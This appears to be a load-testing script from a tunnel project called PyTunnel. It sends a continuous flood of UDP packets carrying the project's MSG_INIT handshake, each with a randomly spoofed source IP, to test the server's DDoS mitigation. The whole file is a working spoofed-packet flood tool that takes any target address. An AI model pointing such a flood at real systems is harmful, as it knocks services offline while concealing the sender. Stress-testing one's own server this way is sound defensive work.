#!/usr/bin/env python3
"""
Sends a flood of spoofed MSG_INIT packets to the server to test DDoS mitigation.
"""

import argparse
import time
import sys
import os
import random

# Add src directory to path to allow importing pytunnel modules
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../src')))

from scapy.all import IP, UDP, send
from pytunnel.common import proto
from nacl.public import PrivateKey

def random_ip():
    """Generates a random spoofed source IP address."""
    return '.'.join(str(random.randint(1, 254)) for _ in range(4))

def main():
    """
    Parses arguments and runs the flood attack.
    """
    parser = argparse.ArgumentParser(description="Run a DDoS flood attack simulation on the PyTunnel server.")
    parser.add_argument("--target", required=True, help="The target server IP address.")
    parser.add_argument("--port", required=True, type=int, help="The target server port.")
    parser.add_argument("--rate", default=100, type=int, help="Packets per second to send.")
    args = parser.parse_args()

    print(f"Starting flood attack on {args.target}:{args.port} at {args.rate} packets/sec...")
    print("Press Ctrl+C to stop.")

    # Create a single, reusable MSG_INIT payload
    # In an attack, the keys don't have to be valid, just the right format
    eph_privkey, eph_pubkey = PrivateKey.generate(), PrivateKey.generate().public_key
    static_privkey, static_pubkey = PrivateKey.generate(), PrivateKey.generate().public_key
    msg_payload = proto.pack_msg_init(bytes(eph_pubkey), bytes(static_pubkey))

    # Calculate sleep time based on rate
    sleep_interval = 1.0 / args.rate if args.rate > 0 else 0

    try:
        while True:
            # Create a packet with a new spoofed source IP and random source port
            packet = (
                IP(src=random_ip(), dst=args.target) /
                UDP(sport=random.randint(1024, 65535), dport=args.port) /
                msg_payload
            )
            send(packet, verbose=0)
            if sleep_interval > 0:
                time.sleep(sleep_interval)
    except KeyboardInterrupt:
        print("\nAttack stopped.")

if __name__ == "__main__":
    main()